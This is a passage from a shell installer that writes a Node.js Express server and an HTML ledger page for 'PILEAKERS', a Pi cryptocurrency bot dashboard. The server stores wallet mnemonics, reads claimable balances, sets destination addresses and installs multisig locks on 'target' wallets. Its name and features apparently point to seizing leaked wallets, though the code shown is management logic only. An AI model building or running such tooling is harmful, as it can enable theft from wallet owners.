        };
    });
}

async function findUserByUsername(username) {
    const normalizedUsername = String(username || "").trim();
    const users = await loadData(USERS_KEY);
    return users.find((user) => String(user.username || "").trim() === normalizedUsername) || null;
}

async function updateUserByUsername(username, updateFields) {
    const normalizedUsername = String(username || "").trim();
    const users = await loadData(USERS_KEY);
    const user = users.find((item) => String(item.username || "").trim() === normalizedUsername);
    if (!user) {
        return false;
    }

    Object.assign(user, updateFields);
    await saveData(USERS_KEY, users);
    return true;
}

function clearUserSessions(username, keepToken = null) {
    const normalizedUsername = String(username || "").trim();
    for (const [token, session] of activeSessions.entries()) {
        if (session.username === normalizedUsername && token !== keepToken) {
            activeSessions.delete(token);
        }
    }
}

async function listWallets() {
    return loadData(WALLETS_KEY);
}

async function findWalletById(walletId) {
    const wallets = await loadData(WALLETS_KEY);
    return wallets.find((wallet) => wallet.id === walletId) || null;
}

async function addWallet(name, mnemonic, publicKey) {
    const wallets = await loadData(WALLETS_KEY);
    const newWallet = {
        id: crypto.randomUUID(),
        name,
        mnemonic,
        public_key: publicKey,
        created_at: utcIso(),
    };
    wallets.push(newWallet);
    await saveData(WALLETS_KEY, wallets);
    return newWallet;
}

async function deleteWalletById(walletId) {
    const wallets = await loadData(WALLETS_KEY);
    const filtered = wallets.filter((wallet) => wallet.id !== walletId);
    if (filtered.length < wallets.length) {
        await saveData(WALLETS_KEY, filtered);
        return true;
    }
    return false;
}

async function listDestinations() {
    return loadData(DESTINATIONS_KEY);
}

async function addDestination(name, address) {
    const destinations = await loadData(DESTINATIONS_KEY);
    const newDestination = {
        id: crypto.randomUUID(),
        name,
        address,
        created_at: utcIso(),
    };
    destinations.push(newDestination);
    await saveData(DESTINATIONS_KEY, destinations);
    return newDestination;
}

async function deleteDestinationById(destinationId) {
    const destinations = await loadData(DESTINATIONS_KEY);
    const filtered = destinations.filter((destination) => destination.id !== destinationId);
    if (filtered.length < destinations.length) {
        await saveData(DESTINATIONS_KEY, filtered);
        return true;
    }
    return false;
}

async function listServers() {
    return loadData(SERVERS_KEY);
}

async function addServer(name, url, location = "") {
    const servers = await listServers();
    const newServer = {
        id: crypto.randomUUID(),
        name: String(name || "").trim(),
        url: normalizeServerUrl(url),
        location: String(location || "").trim(),
    };
    servers.push(newServer);
    await saveData(SERVERS_KEY, servers);
    return newServer;
}

async function deleteServerById(serverId) {
    const servers = await listServers();
    const filtered = servers.filter((server) => server.id !== serverId);
    if (filtered.length < servers.length) {
        await saveData(SERVERS_KEY, filtered);
        return true;
    }
    return false;
}

async function listWorkers() {
    const workers = await loadData(WORKERS_KEY);
    const servers = await listServers();
    const serverMap = new Map(servers.map((server) => [server.id, server]));

    return workers.map((worker) => {
        const serverConfig = serverMap.get(worker.server_id);
        if (serverConfig) {
            return {
                ...worker,
                server_name: serverConfig.name,
                server_url: serverConfig.url,
                server_location: serverConfig.location || "",
            };
        }

        return {
            ...worker,
            server_name: "Unassigned",
            server_url: "N/A",
            server_location: "",
        };
    });
}

function normalizeWorkerPortValue(value, fallback) {
    const parsed = Number.parseInt(value, 10);
    return Number.isSafeInteger(parsed) && parsed > 0 ? parsed : fallback;
}

function getNextWorkerPort(workers = []) {
    const used = new Set((workers || []).map((worker) => normalizeWorkerPortValue(worker.port || worker.worker_port, 0)).filter(Boolean));
    let port = PM2_WORKER_PORT_BASE;
    while (used.has(port)) {
        port += 1;
    }
    return port;
}

async function startPm2WorkerProcess(worker) {
    const pm2Name = worker.pm2_name || normalizePm2WorkerName(worker.name);
    const port = normalizeWorkerPortValue(worker.port || worker.worker_port, PM2_WORKER_PORT_BASE);
    const env = {
        WORKER_NAME: worker.name,
        WORKER_PORT: String(port),
        WEB_SERVICE_URL: process.env.WEB_SERVICE_URL || `http://127.0.0.1:${PORT}`,
    };
    await runPm2Command(["delete", pm2Name], { timeout: 30000 }).catch(() => null);
    await runPm2Command(["start", "index.js", "--name", pm2Name, "--update-env", "--", worker.name], { env, timeout: 60000 });
    if (PM2_AUTO_SAVE) {
        await runPm2Command(["save"], { timeout: 30000 }).catch(() => null);
    }
    return { pm2_name: pm2Name, port, pm2_status: "online", pm2_error: "" };
}

async function deletePm2WorkerProcess(worker) {
    const pm2Name = worker?.pm2_name || normalizePm2WorkerName(worker?.name || "");
    if (!pm2Name) {
        return false;
    }
    await runPm2Command(["delete", pm2Name], { timeout: 30000 }).catch(() => null);
    if (PM2_AUTO_SAVE) {
        await runPm2Command(["save"], { timeout: 30000 }).catch(() => null);
    }
    return true;
}

async function addWorker(name, serverId) {
    const workers = await loadData(WORKERS_KEY);
    const port = getNextWorkerPort(workers);
    const newWorker = {
        id: crypto.randomUUID(),
        name,
        server_id: serverId,
        port,
        pm2_name: normalizePm2WorkerName(name),
        pm2_status: "pending",
        created_at: utcIso(),
    };
    try {
        Object.assign(newWorker, await startPm2WorkerProcess(newWorker));
        broadcastLog(`✅ Worker ${name} dibuat otomatis di PM2 port ${newWorker.port} (${newWorker.pm2_name})`, "success");
    } catch (err) {
        newWorker.pm2_status = "error";
        newWorker.pm2_error = err.message;
        broadcastLog(`⚠️ Worker ${name} tersimpan tetapi PM2 gagal dibuat: ${err.message}`, "warning");
    }
    workers.push(newWorker);
    await saveData(WORKERS_KEY, workers);
    await saveWorkerConfigSnapshot(newWorker.name);
    return newWorker;
}

async function deleteWorkerById(workerId) {
    const workers = await loadData(WORKERS_KEY);
    const target = workers.find((worker) => worker.id === workerId);
    const filtered = workers.filter((worker) => worker.id !== workerId);
    if (filtered.length < workers.length) {
        if (target) {
            await deletePm2WorkerProcess(target);
            broadcastLog(`🗑️ Worker ${target.name || workerId} dihapus dari Redis dan PM2`, "warning");
        }
        await saveData(WORKERS_KEY, filtered);
        return true;
    }
    return false;
}

async function listBots() {
    const bots = await loadAllBots();
    const workers = await listWorkers();
    const servers = await listServers();

    // Bot Status "Fee Loss" harus mengikuti state Funding Wallet,
    // bukan nilai funding_fee_loss_pi yang tersimpan per worker/bot.
    // State ini ditulis oleh worker sebagai saldo awal/akhir funding wallet.
    const fundingStateByWalletId = new Map();
    const fundingWalletIds = [
        ...new Set(bots.map((bot) => String(bot?.fee_payer_id || "").trim()).filter(Boolean)),
    ];

    await Promise.all(
        fundingWalletIds.map(async (walletId) => {
            const stateKey = getFundingWalletStateKey(walletId);
            const state = stateKey ? await loadJsonObject(stateKey, {}) : {};
            const beforePi = formatPiBalanceValue(state.before_pi);
            const afterPi = formatPiBalanceValue(state.after_pi);
            const lossPi =
                beforePi && afterPi
                    ? calculateFundingWalletLossPi(beforePi, afterPi, state.loss_pi)
                    : formatPiNumber(state.loss_pi || 0);

            fundingStateByWalletId.set(walletId, {
                funding_balance_before_pi: beforePi,
                funding_balance_after_pi: afterPi,
                funding_fee_loss_pi: lossPi,
                funding_fee_loss_updated_at: state.updated_at || null,
            });
        })
    );

    return bots.map((bot) => {
        const walletId = String(bot?.fee_payer_id || "").trim();
        const fundingState = fundingStateByWalletId.get(walletId) || {
            funding_balance_before_pi: null,
            funding_balance_after_pi: null,
            funding_fee_loss_pi: "0.0000000",
            funding_fee_loss_updated_at: null,
        };
        const workerConfig = workers.find((worker) => worker.name === bot.worker_name);
        if (!workerConfig) {
            return { ...bot, ...fundingState };
        }

        const serverId = workerConfig.server_id;
        if (!serverId) {
            return {
                ...bot,
                ...fundingState,
                server_name: "Unassigned",
                horizon_url: "N/A",
                server_location: "",
            };
        }

        const serverConfig = servers.find((server) => server.id === serverId);
        if (!serverConfig) {
            return {
                ...bot,
                ...fundingState,
                server_name: "Unassigned",
                horizon_url: "N/A",
                server_location: "",
            };
        }

        return {
            ...bot,
            ...fundingState,
            server_name: serverConfig.name,
            horizon_url: serverConfig.url,
            server_location: serverConfig.location || "",
        };
    });
}

async function findBotByName(botName) {
    const bots = await loadAllBots();
    return bots.find((bot) => bot.bot_name === botName) || null;
}

async function upsertWorkerData(workerName, dataName, item, getIdentity) {
    if (!item) {
        return;
    }

    const key = getWorkerDataKey(workerName, dataName);
    const items = await loadData(key);
    const identity = getIdentity(item);
    if (!identity) {
        return;
    }

    const index = items.findIndex((existing) => getIdentity(existing) === identity);
    if (index >= 0) {
        items[index] = item;
    } else {
        items.push(item);
    }

    await saveData(key, items);
}

async function saveWorkerConfigSnapshot(workerName) {
    const normalizedWorkerName = normalizeWorkerName(workerName);
    const workers = await loadData(WORKERS_KEY);
    const worker = workers.find(
        (item) => String(item.name || "").toLowerCase() === normalizedWorkerName.toLowerCase()
    );
    if (!worker) {
        return;
    }

    await saveData(getWorkerDataKey(normalizedWorkerName, "workers"), [worker]);

    const servers = await loadData(SERVERS_KEY);
    const server = servers.find((item) => item.id === worker.server_id);
    if (server) {
        await saveData(getWorkerDataKey(normalizedWorkerName, "servers"), [server]);
    }
}

async function saveWorkerRuntimeSnapshot(botData) {
    const workerName = getBotWorkerName(botData);
    await saveWorkerConfigSnapshot(workerName);

    if (botData.fee_payer_id) {
        const wallets = await loadData(WALLETS_KEY);
        const wallet = wallets.find((item) => item.id === botData.fee_payer_id);
        await upsertWorkerData(workerName, "wallets", wallet, (item) => String(item.id || ""));
    }

    if (botData.username) {
        const users = await loadData(USERS_KEY);
        const user = users.find((item) => item.username === botData.username);
        if (user) {
            await upsertWorkerData(
                workerName,
                "users",
                {
                    id: user.id,
                    username: user.username,
                    email: user.email || null,
                },
                (item) => String(item.username || "")
            );
        }
    }
}

async function refreshWorkerRuntimeSnapshots() {
    const bots = await loadAllBots();
    for (const bot of bots) {
        await saveWorkerRuntimeSnapshot(bot);
    }
    return bots.length;
}

async function addBot(botData) {
    const key = getWorkerBotsKey(botData.worker_name);
    const bots = await loadData(key);
    const newBot = {
        ...normalizeBotForStorage(botData),
        id: crypto.randomUUID(),
    };
    bots.push(newBot);
    await saveData(key, bots);
    await saveWorkerRuntimeSnapshot(newBot);
    return newBot;
}

async function addBots(botRows) {
    const existingBots = await loadAllBots();
    const existingNames = new Set(existingBots.map((bot) => bot.bot_name));
    const newNames = new Set();

    for (const botRow of botRows) {
        if (existingNames.has(botRow.bot_name) || newNames.has(botRow.bot_name)) {
            throw new Error(`Bot name exists: ${botRow.bot_name}`);
        }
        newNames.add(botRow.bot_name);
    }

    const newBots = botRows.map((botRow) => ({
        ...normalizeBotForStorage(botRow),
        id: crypto.randomUUID(),
    }));

    const botsByKey = new Map();
    for (const bot of newBots) {
        const key = getWorkerBotsKey(bot.worker_name);
        if (!botsByKey.has(key)) {
            botsByKey.set(key, []);
        }
        botsByKey.get(key).push(bot);
    }

    for (const [key, botsToAdd] of botsByKey) {
        const workerBots = await loadData(key);
        workerBots.push(...botsToAdd);
        await saveData(key, workerBots);
    }

    for (const bot of newBots) {
        await saveWorkerRuntimeSnapshot(bot);
    }

    return newBots;
}

async function deleteBotByName(botName) {
    let deleted = false;
    const keys = [...(await listWorkerBotKeys()), BOTS_KEY];

    for (const key of keys) {
        const bots = await loadData(key);
        const filtered = bots.filter((bot) => bot.bot_name !== botName && bot.parent_bot_name !== botName);
        if (filtered.length < bots.length) {
            await saveData(key, filtered);
            deleted = true;
        }
    }

    return deleted;
}

app.get("/", (req, res) => {
    const htmlPage = fs.readFileSync(htmlPath, "utf8");
    res.set("Content-Type", "text/html; charset=utf-8").send(htmlPage);
});

app.get("/health", (req, res) => {
    res.json({ status: "healthy", timestamp: utcIso() });
});

app.post(
    "/api/change-password",
    authMiddleware,
    asyncHandler(async (req, res) => {
        const data = req.body || {};
        const username = req.userSession.username;
        const currentPassword = String(data.currentPassword ?? data.oldPassword ?? "");
        const newPassword = String(data.newPassword ?? "");
        const confirmPassword = String(data.confirmPassword ?? newPassword);

        if (req.userSession.isEmergencyOwner) {
            return res.status(403).json({
                success: false,
                error: "Akun recovery tidak bisa mengganti password dari UI. Ubah PASSWORD_HASH_C di .env.",
            });
        }

        const user = await findUserByUsername(username);

        if (!verifyUserPassword(user, currentPassword)) {
            return res.status(400).json({ success: false, error: "Password lama salah" });
        }

        if (newPassword !== confirmPassword) {
            return res.status(400).json({ success: false, error: "Konfirmasi password tidak sama" });
        }

        const passwordError = validatePasswordInput(newPassword);
        if (passwordError) {
            return res.status(400).json({ success: false, error: passwordError });
        }

        if (verifyUserPassword(user, newPassword)) {
            return res.status(400).json({ success: false, error: "Password baru tidak boleh sama dengan password lama" });
        }

        await updateUserByUsername(username, { password_hash: hashPassword(newPassword), password: undefined });
        const authHeader = req.get("Authorization") || "";
        clearUserSessions(username, authHeader.startsWith("Bearer ") ? authHeader.slice(7) : null);
        return res.json({ success: true, message: "Password berhasil diganti" });
    })
);

app.post(
    "/api/forgot-password/request",
    asyncHandler(async (req, res) => {
        const username = String(req.body?.username || "").trim();
        if (!username) {
            return res.status(400).json({ success: false, error: "Username wajib diisi" });
        }

        const user = await findUserByUsername(username);
        if (!user) {
            return res.status(404).json({ success: false, error: "Username tidak ditemukan" });
        }

        const otp = generateOtp();
        const expiresAt = Date.now() + Math.max(60000, PASSWORD_RESET_OTP_TTL_MS);
        passwordResetOtps.set(username, {
            otpHash: hashOtp(otp),
            expiresAt,
            attempts: 0,
        });

        try {
            await sendTelegramMessage(
                `🔐 OTP reset password PILEAKERS\n\nUsername: ${username}\nOTP: ${otp}\nBerlaku: ${Math.ceil((expiresAt - Date.now()) / 60000)} menit`
            );
        } catch (err) {
            passwordResetOtps.delete(username);
            return res.status(500).json({ success: false, error: `Gagal mengirim OTP Telegram: ${err.message}` });
        }

        return res.json({ success: true, message: "OTP reset password sudah dikirim ke Telegram" });
    })
);

app.post(
    "/api/forgot-password/reset",
    asyncHandler(async (req, res) => {
        const username = String(req.body?.username || "").trim();
        const otp = String(req.body?.otp || "").trim();
        const newPassword = String(req.body?.newPassword || "");
        const confirmPassword = String(req.body?.confirmPassword ?? newPassword);
        const resetState = passwordResetOtps.get(username);

        if (!username || !otp) {
            return res.status(400).json({ success: false, error: "Username dan OTP wajib diisi" });
        }
        if (!resetState || resetState.expiresAt < Date.now()) {
            passwordResetOtps.delete(username);
            return res.status(400).json({ success: false, error: "OTP tidak valid atau sudah expired" });
        }
        if (resetState.attempts >= PASSWORD_RESET_OTP_MAX_ATTEMPTS) {
            passwordResetOtps.delete(username);
            return res.status(429).json({ success: false, error: "Terlalu banyak percobaan OTP" });
        }
        if (resetState.otpHash !== hashOtp(otp)) {
            resetState.attempts += 1;
            return res.status(400).json({ success: false, error: "OTP salah" });
        }
        if (newPassword !== confirmPassword) {
            return res.status(400).json({ success: false, error: "Konfirmasi password tidak sama" });
        }

        const passwordError = validatePasswordInput(newPassword);
        if (passwordError) {
            return res.status(400).json({ success: false, error: passwordError });
        }

        const updated = await updateUserByUsername(username, { password_hash: hashPassword(newPassword), password: undefined });
        if (!updated) {
            return res.status(404).json({ success: false, error: "Username tidak ditemukan" });
        }

        passwordResetOtps.delete(username);
        clearUserSessions(username);
        return res.json({ success: true, message: "Password berhasil direset. Silakan login ulang." });
    })
);

app.post(
    "/api/worker-logs",
    asyncHandler(async (req, res) => {
        const data = req.body || {};
        const message = data.message || "";
        const logType = data.type || "info";
        const details = data.details ?? null;
        const workerName = data.worker_name || "Worker";

        if (isNoisySyncLog(message)) {
            return res.json({
                success: true,
                suppressed: true,
                message: "Noisy sync log suppressed",
            });
        }

        if (message) {
            broadcastLog(`[${workerName}] ${message}`, logType, details);
        }

        res.json({
            success: true,
            message: "Log to dashboard",
        });
    })
);

app.post(
    "/api/login",
    asyncHandler(async (req, res) => {
        const data = req.body || {};
        const username = String(data.username || "").trim();
        const password = String(data.password || "");
        let user = await findUserByUsername(username);
        let isEmergencyOwner = false;

        if (verifyEmergencyOwnerLogin(username, password)) {
            user = getEmergencyOwnerUser();
            isEmergencyOwner = true;
        } else if (!verifyUserPassword(user, password)) {
            return res.status(401).json({ success: false, error: "Invalid credentials" });
        }

        const token = generateToken();
        activeSessions.set(token, {
            username: user.username,
            userId: user.id,
            loginTime: Date.now() / 1000,
            isEmergencyOwner,
        });

        if (isEmergencyOwner) {
            broadcastLog(`Emergency owner login digunakan untuk ${user.username}`, "warn");
        }

        return res.json({ success: true, token, message: "Login successful" });
    })
);

app.post(
    "/api/get-balances",
    authMiddleware,
    asyncHandler(async (req, res) => {
        const data = req.body || {};
        try {
            const publicKey = derivePublicKeyFromMnemonic(data.mnemonic);
            const balances = await fetchClaimableBalances(publicKey, data.network || "mainnet");
            return res.json({ success: true, data: balances });
        } catch (err) {
            return res.json({ success: false, error: err.message });
        }
    })
);

app.get(
    "/api/destinations",
    authMiddleware,
    asyncHandler(async (req, res) => {
        res.json({ success: true, data: await listDestinations() });
    })
);

app.post(
    "/api/destinations",
    authMiddleware,
    asyncHandler(async (req, res) => {
        const data = req.body || {};
        const name = String(data.name || "").trim();
        const address = String(data.address || "").trim();

        if (!name || !address) {
            return res.status(400).json({ success: false, error: "Name and address required" });
        }

        const newDestination = await addDestination(name, address);
        return res.json({ success: true, data: newDestination, message: "Destination added" });
    })
);

app.delete(
    "/api/destinations/:destId",
    authMiddleware,
    asyncHandler(async (req, res) => {
        if (await deleteDestinationById(req.params.destId)) {
            return res.json({ success: true, message: "Destination deleted" });
        }
        return res.status(404).json({ success: false, error: "Not found" });
    })
);

app.get(
    "/api/fee-payers",
    authMiddleware,
    asyncHandler(async (req, res) => {
        res.json({ success: true, data: await listWalletsWithBalances() });
    })
);

app.post(
    "/api/fee-payers",
    authMiddleware,
    asyncHandler(async (req, res) => {
        const data = req.body || {};
        const name = String(data.name || "").trim();
        const mnemonicPhrase = String(data.mnemonic || "").trim();

        if (!name || !mnemonicPhrase) {
            return res.status(400).json({ success: false, error: "Name and mnemonic required" });
        }

        try {
            const publicKey = derivePublicKeyFromMnemonic(mnemonicPhrase);
            const newWallet = await addWallet(name, mnemonicPhrase, publicKey);
            return res.json({
                success: true,
                data: newWallet,
                message: "Fee wallet created successfully",
            });
        } catch (err) {
            return res.status(400).json({ success: false, error: `Invalid mnemonic: ${err.message}` });
        }
    })
);

app.delete(
    "/api/fee-payers/:walletId",
    authMiddleware,
    asyncHandler(async (req, res) => {
        if (await deleteWalletById(req.params.walletId)) {
            return res.json({ success: true, message: "Wallet deleted" });
        }
        return res.status(404).json({ success: false, error: "Not found" });
    })
);

app.get(
    "/api/funding-history",
    authMiddleware,
    asyncHandler(async (req, res) => {
        const history = await listFundingWalletHistory();
        return res.json({ success: true, data: history.entries, summary: history.summary });
    })
);

app.route("/api/servers")
    .get(
        authMiddleware,
        asyncHandler(async (req, res) => {
            res.json({ success: true, data: await listServersWithStats() });
        })
    )
    .post(
        authMiddleware,
        asyncHandler(async (req, res) => {
            const data = req.body || {};
            const name = String(data.name || "").trim();
            const url = normalizeServerUrl(data.url);
            const location = String(data.location || "").trim();
            if (!name || !url) {
                return res.status(400).json({ success: false, error: "Name and URL required" });
            }
            if (!/^https?:\/\//i.test(url)) {
                return res.status(400).json({ success: false, error: "URL must start with http:// or https://" });
            }
            const newServer = await addServer(name, url, location);
            res.json({ success: true, data: newServer });
        })
    );

app.delete(
    "/api/servers/:id",
    authMiddleware,
    asyncHandler(async (req, res) => {
        if (await deleteServerById(req.params.id)) {
            return res.json({ success: true });
        }
            return res.status(404).json({ success: false });
        })
    );

app.route("/api/workers")
    .get(
        authMiddleware,
        asyncHandler(async (req, res) => {
            res.json({ success: true, data: await listWorkers() });
        })
    )
    .post(
        authMiddleware,
        asyncHandler(async (req, res) => {
            const data = req.body || {};
            const newWorker = await addWorker(data.name, data.server_id);
            res.json({ success: true, data: newWorker });
        })
    );

app.delete(
    "/api/workers/:id",
    authMiddleware,
    asyncHandler(async (req, res) => {
        if (await deleteWorkerById(req.params.id)) {
            return res.json({ success: true });
        }
        return res.status(404).json({ success: false });
    })
);

app.get(
    "/api/workers/:workerName/server",
    asyncHandler(async (req, res) => {
        try {
            const workers = await loadData(WORKERS_KEY);
            const worker = workers.find(
                (item) => String(item.name || "").toLowerCase() === String(req.params.workerName || "").toLowerCase()
            );

            if (!worker) {
                return res.status(404).json({ success: false, error: "Worker not found" });
            }

            const servers = await loadData(SERVERS_KEY);
            const server = servers.find((item) => item.id === worker.server_id);
            if (!server) {
                return res.status(404).json({ success: false, error: "No server assigned" });
            }

            return res.json({
                success: true,
                name: server.name,
                url: server.url,
                server_url: server.url,
                location: server.location || "",
            });
        } catch (err) {
            return res.status(500).json({ success: false, error: err.message });
        }
    })
);

app.route("/api/settings/telegram")
    .get(
        authMiddleware,
        asyncHandler(async (req, res) => {
            const settings = await getSettings();
            res.json({ success: true, data: publicTelegramSettings(settings) });
        })
    )
    .post(
        authMiddleware,
        asyncHandler(async (req, res) => {
            try {
                const settings = await saveTelegramSettings(req.body || {});
                res.json({
                    success: true,
                    data: publicTelegramSettings(settings),
                    message: "Telegram settings saved to Redis",
                });
            } catch (err) {
                res.status(400).json({ success: false, error: err.message });
            }
        })
    );

app.route("/api/settings/call-submit")
    .get(
        authMiddleware,
        asyncHandler(async (req, res) => {
            const settings = await getSettings();
            res.json({ success: true, data: publicCallSubmitSettings(settings) });
        })
    )
    .post(
        authMiddleware,
        asyncHandler(async (req, res) => {
            try {
                const settings = await saveCallSubmitSettings(req.body || {});
                res.json({
                    success: true,
                    data: publicCallSubmitSettings(settings),
                    message: "Call Submit settings saved to Redis",
                });
            } catch (err) {
                res.status(400).json({ success: false, error: err.message });
            }
        })
    );

app.route("/api/settings/timezone")
    .get(
        authMiddleware,
        asyncHandler(async (req, res) => {
            const settings = await getSettings();
            res.json({ success: true, data: publicTimezoneSettings(settings) });
        })
    )
    .post(
        authMiddleware,
        asyncHandler(async (req, res) => {
            try {
                const settings = await saveTimezoneSettings(req.body || {});
                res.json({
                    success: true,
                    data: publicTimezoneSettings(settings),
                    message: "Timezone settings saved to Redis",
                });
            } catch (err) {
                res.status(400).json({ success: false, error: err.message });
            }
        })
    );

app.get(
    "/api/multisig/locked",
    authMiddleware,
    asyncHandler(async (req, res) => {
        const rows = (await listMultisigLockedWallets()).map(publicMultisigLockedWallet);
        res.json({ success: true, data: rows });
    })
);

app.post(
    "/api/multisig/locked/delete",
    authMiddleware,
    asyncHandler(async (req, res) => {
        try {
            const data = await deleteMultisigLockedWalletEntry({
                publicKey: req.body?.public_key,
                fundingPublicKey: req.body?.funding_public_key,
                network: req.body?.network,
            });
            res.json({ success: true, data, message: `Locked wallet dihapus: ${data.removed_count} row, pending update: ${data.pending_removed_count}` });
        } catch (err) {
            res.status(400).json({ success: false, error: err.message });
        }
    })
);

app.get(
    "/api/multisig/pending-locks",
    authMiddleware,
    asyncHandler(async (req, res) => {
        const rows = (await listMultisigPendingLocks()).map(publicMultisigPendingLock);
        res.json({ success: true, data: rows });
    })
);

app.get(
    "/api/multisig/protocol",
    authMiddleware,
    asyncHandler(async (req, res) => {
        const config = await resolveMultisigNetworkConfig(req.query || {});
        const data = await fetchMultisigProtocolInfoWithFallback(config.horizonUrls, MULTISIG_REQUIRED_PROTOCOL_VERSION);
        res.json({ success: true, data: { ...data, network: config.network, horizon_urls: config.horizonUrls } });
    })
);

app.post(
    "/api/multisig/preview-targets",
    authMiddleware,
    asyncHandler(async (req, res) => {
        try {
            const data = await previewMultisigTargets(req.body || {});
            res.json({ success: true, data, message: `Preview target: ${data.success_count}/${data.total} valid` });
        } catch (err) {
            res.status(400).json({ success: false, error: err.message });
        }
    })
);

app.post(
    "/api/multisig/install-lock",
    authMiddleware,
    asyncHandler(async (req, res) => {
        try {
            const data = await executeMultisigInstallLock(req.body || {});
            if (data.queued) {
                broadcastLog(`Multisig Lock disimpan: ${data.queued_count || 0}/${data.total} wallet menunggu protocol ${data.protocol?.required_protocol_version || MULTISIG_REQUIRED_PROTOCOL_VERSION}`, "warning");
                res.json({ success: true, data, message: `Install Lock disimpan: ${data.queued_count || 0}/${data.total} wallet menunggu Protocol ${data.protocol?.required_protocol_version || MULTISIG_REQUIRED_PROTOCOL_VERSION}` });
                return;
            }
            broadcastLog(`Multisig Lock selesai: ${data.success_count}/${data.total} wallet berhasil dikunci`, data.success_count ? "success" : "warn");
            res.json({ success: true, data, message: `Install Lock selesai: ${data.success_count}/${data.total} berhasil` });
        } catch (err) {
            res.status(400).json({ success: false, error: err.message });
        }
    })
);

app.post(
    "/api/multisig/run",
    authMiddleware,
    asyncHandler(async (req, res) => {
        try {
            const data = await executeMultisigFundingAction(req.body || {});
            broadcastLog(`Multisig ${data.mode} selesai: ${data.success_count}/${data.total} wallet berhasil`, data.success_count ? "success" : "warn");
            res.json({ success: true, data, message: `Multisig ${data.mode}: ${data.success_count}/${data.total} berhasil` });
        } catch (err) {
            res.status(400).json({ success: false, error: err.message });
        }
    })
);

app.route("/api/bots")
    .get(
        authMiddleware,
        asyncHandler(async (req, res) => {
            res.json({ success: true, data: await listBots() });
        })
    )
    .post(
        authMiddleware,
        asyncHandler(async (req, res) => {
            const botData = { ...(req.body || {}) };

            if (!botData.custom_memo || String(botData.custom_memo).trim() === "") {
                botData.custom_memo = "AUTO";
            }

            if (await findBotByName(botData.bot_name)) {
                return res.status(400).json({ success: false, error: "Bot name exists" });
            }

            botData.username = req.userSession.username;
            botData.created_at = utcIso();
            let botRows;
            try {
                botRows = await buildWorkerDistributedBots(botData);
            } catch (err) {
                return res.status(400).json({ success: false, error: err.message });
            }

            try {
                const newBots = await addBots(botRows);
                return res.json({
                    success: true,
                    data: newBots.length === 1 ? newBots[0] : newBots,
                    bots: newBots,
                    distributed: newBots.length > 1,
                    message: newBots.length > 1 ? `Created ${newBots.length} worker jobs` : "Bot created",
                });
            } catch (err) {
                return res.status(400).json({ success: false, error: err.message });
            }
        })
    );

app.delete(
    "/api/bots/:botName",
    authMiddleware,
    asyncHandler(async (req, res) => {
        if (await deleteBotByName(req.params.botName)) {
            return res.json({ success: true });
        }
        return res.status(404).json({ success: false });
    })
);

app.get("/logs/stream", (req, res) => {
    res.set({
        "Content-Type": "text/event-stream",
        "Cache-Control": "no-cache",
        Connection: "keep-alive",
        "X-Accel-Buffering": "no",
    });
    res.flushHeaders?.();

    logClients.add(res);
    res.write(": connected\n\n");

    const heartbeat = setInterval(() => {
        res.write(": heartbeat\n\n");
    }, 30000);

    req.on("close", () => {
        clearInterval(heartbeat);
        logClients.delete(res);
        res.end();
    });
});

app.use((err, req, res, next) => {
    console.error(err);
    if (res.headersSent) {
        return next(err);
    }
    return res.status(500).json({ success: false, error: err.message || "Internal server error" });
});

async function start() {
    try {
        await redisClient.connect();
        await redisClient.ping();
        console.log("Connected to Redis successfully.");
        await getSettings();
        await migrateLegacyBotsToWorkerKeys();
        await migrateMultisigLegacyEncryptedDataIfNeeded().catch((err) => console.log(`[Multisig Legacy Migration] ${err.message || err}`));
        const snapshotCount = await refreshWorkerRuntimeSnapshots();
        console.log(`Refreshed worker-scoped Redis snapshots for ${snapshotCount} bot(s).`);
        startMultisigProtocolWatcher();
        startMultisigSignerWatchRuntime();
        startTelegramControlBot();
    } catch (err) {
        console.log("Redis connection failed! Please ensure Redis is running.");
    }

    const server = app.listen(PORT, "0.0.0.0", () => {
        console.log(`Server running on http://0.0.0.0:${PORT}`);
    });
    server.on("error", (err) => {
        console.log(`Dashboard HTTP server error on port ${PORT}: ${err.message}`);
    });
}

start();

module.exports = {
    app,
    generateOtp,
    generateToken,
    generateUniqueMemo,
};


PILEAKERS_APP_JS

  backup_file "ledger.html"
  cat > "ledger.html" <<'PILEAKERS_LEDGER_HTML'
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width,initial-scale=1">
        <title>PI Scanner Ledger</title>
        <style>
            :root {
                --bg: #0d0f12;
                --panel: #151a1f;
                --panel-2: #101418;
                --line: rgba(255,255,255,.11);
                --text: #f6f7f9;
                --muted: #a8b1bd;
                --cyan: #4dd4f7;
                --green: #3ddc84;
                --amber: #f8c84e;
                --red: #ff6b6b;
            }
            *{margin:0;padding:0;box-sizing:border-box}
            body{font-family:Segoe UI,Arial,sans-serif;background:linear-gradient(135deg,#0d0f12 0%,#171514 48%,#0f1915 100%);color:var(--text);padding:24px;min-height:100vh;}
            .container{width:min(1500px,100%);margin:auto}
            .top-actions{display:flex;justify-content:flex-end;margin-bottom:12px}
            .card{background:rgba(21,26,31,.92);border:1px solid var(--line);padding:20px;border-radius:8px;margin-bottom:18px;box-shadow:0 18px 38px rgba(0,0,0,.28);}
            h1{font-size:clamp(24px,3vw,34px);line-height:1.15;font-weight:900;margin-bottom:18px;color:#fff;}
            .grid{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:14px;margin-bottom:16px;align-items:end;}
            label{font-size:12px;display:block;margin-bottom:7px;color:var(--muted);font-weight:700;text-transform:uppercase}
            input,select{width:100%;min-height:44px;padding:12px 13px;border-radius:8px;border:1px solid var(--line);background:#0f1317;color:var(--text);outline:none;}
            input:focus{border-color:var(--cyan);box-shadow:0 0 0 3px rgba(77,212,247,.14)}
            input:disabled{opacity:.65}
            .checkbox-label{height:44px;display:flex;gap:10px;align-items:center;margin:0;text-transform:none;font-size:13px}
            .checkbox-label input{width:18px;min-height:18px}
            .actions{display:flex;gap:10px;flex-wrap:wrap}
            button,.nav-button{min-height:44px;padding:12px 16px;border:none;border-radius:8px;font-weight:900;cursor:pointer;transition:.2s;text-decoration:none;display:inline-flex;align-items:center;justify-content:center;}
            button:hover,.nav-button:hover{transform:translateY(-1px);filter:brightness(1.05)}
            .primary{background:#4dd4f7;color:#071014}
            .success{background:#3ddc84;color:#07140d}
            .secondary{background:#242b32;color:var(--text);border:1px solid var(--line)}
            .title{font-size:18px;font-weight:900;margin-bottom:12px;color:#fff}
            .stats-grid{display:flex;gap:12px;flex-wrap:wrap}
            .stat-item{min-width:180px;background:var(--panel-2);border:1px solid var(--line);border-radius:8px;padding:12px}
